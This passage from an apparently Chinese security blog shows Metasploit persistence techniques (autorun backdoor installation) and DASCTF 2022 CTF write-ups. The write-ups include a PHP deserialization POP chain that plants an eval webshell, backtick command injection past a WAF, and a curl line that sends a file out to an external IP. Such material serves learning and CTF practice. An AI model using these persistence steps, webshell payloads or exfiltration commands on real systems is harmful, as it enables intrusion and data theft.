class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚3.persistence_exeå†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°<ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul>å°è¯•ä¸€ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistenceå®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistenceå’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚<h2 id="å‚è€ƒ-5"><a href="#å‚è€ƒ-5" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›</title>
      <link href="/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°é¢˜ç›®ååˆ†æ<br>æˆ‘ä»¬åº”å…ˆä»finä¸­è¿›å…¥ï¼Œåˆ™<br>__destruct-&gt;_toString-&gt;run()-&gt;__invoke-&gt;__call-&gt;get_flag()<br>åˆ™pocä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$a2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$a3</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> mix();</span><br><span class="line"><span class="variable">$d</span>-&gt;m1 = <span class="string">&#x27;?&gt;&lt;?=eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="variable">$a3</span>-&gt;f1 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$a3</span>;</span><br><span class="line"><span class="variable">$a2</span>-&gt;f1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;f1 = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;?&gt;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>æ‹¿åˆ°æœ¬é¢˜ï¼Œè¿›å…¥çœ‹åˆ°æºç <br><img src="https://img-blog.csdnimg.cn/8b9bf4ad64fb41af87a7c8ed319e537a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>çœ‹åˆ°wafç»•è¿‡äº†è®¸å¤šå‡½æ•°<br>åœ¨å†™çš„æ—¶å€™æœ‰è®¸å¤šä¸æ‡‚å¾—ï¼ŒåŒæ—¶ä¹Ÿæƒ³å¤šäº†<br>è¿™é¢˜ç»™å‡ºäº†æºä»£ç ï¼Œçœ‹åˆ°WAFè¿‡æ»¤äº†å°æ‹¬å·ï¼Œæ„Ÿè§‰æ²¡åŠæ³•æ‰§è¡Œå‡½æ•°ï¼Œä»è€Œæ”¾å¼ƒeval()å‡½æ•°ä¸ºåˆ‡å…¥ç‚¹ï¼Œè½¬è€Œçœ‹èµ·os.system()å‡½æ•°ã€‚WAFä¸­å¹¶æ²¡æœ‰è¿‡æ»¤åå¼•å·ï¼Œå·²çŸ¥Linuxä¸­åå¼•å·æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œè¿™é‡Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls`</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·åœ¨evalä¸­å°±ä¼šæŠ¥é”™ï¼Œå¯¼è‡´ä¸ä¼šæ‰§è¡Œos.systemï¼Œåæ¥æƒ³åˆ°åˆ©ç”¨Pythonä¸­çš„æ³¨é‡Šç¬¦æŠŠåå¼•å·çš„å†…å®¹æ³¨é‡Šäº†ï¼Œæœ€åPayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span><span class="comment">#`ls`</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ç©ºæ ¼æ›¿æ¢ä¸º%09<br>(å­¦åˆ°äº†curlå¸¦å¤–ã€ç¾æ»‹æ»‹ã€‘)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>ls%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>cat%<span class="number">09</span>Th*%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/21ec8504e29c4a578e25d9167043a25f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>ç›´æ¥ä¸Šä¼ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/3cb8cf8bd2234388a6ada60a7fddeac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ç»æŸ¥æ‰¾å‘ç°putenv,mailæ²¡æœ‰è¢«ban<br>ç°åœ¨å°±æ˜¯å°è¯•èƒ½ä¸èƒ½getshellï¼Œshow_sourceæ²¡æœ‰è¢«banï¼Œä¸Šä¼ çš„æ—¶å€™ä¸€ç›´è¢«æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/7dd3fbee46674898a5e035dd785a17a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>å°è¯•å¤§å°å†™ç»•è¿‡å‘ç°å¯è¡Œ(æˆ–ä½¿ç”¨å…¶ä»–ç»•è¿‡æ–¹å¼ï¼‰</p><blockquote><p>åŠ¨æ€ç»•è¿‡ <?php base64_decode('c2hvd19zb3VyY2U=')('../index.php');?><br>&lt;?php echo (â€˜filâ€™.â€™e_get_contentsâ€™)(â€˜/var/www/html/index.phpâ€™);<br>åœ¨PHPä¸­ï¼Œå‡½æ•°åã€æ–¹æ³•åã€ç±»åã€å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼›ä½†å˜é‡åã€å¸¸é‡ååŒºåˆ†å¤§å°å†™ã€‚</p></blockquote><p><img src="https://img-blog.csdnimg.cn/a5b4f75a4c054c0d8aa667a02b5055c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ä¹‹åè¿›è¡Œæ–‡ä»¶è¯»å–<br><img src="https://img-blog.csdnimg.cn/483380e6a9a744f5a0790f5436bb6cdb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 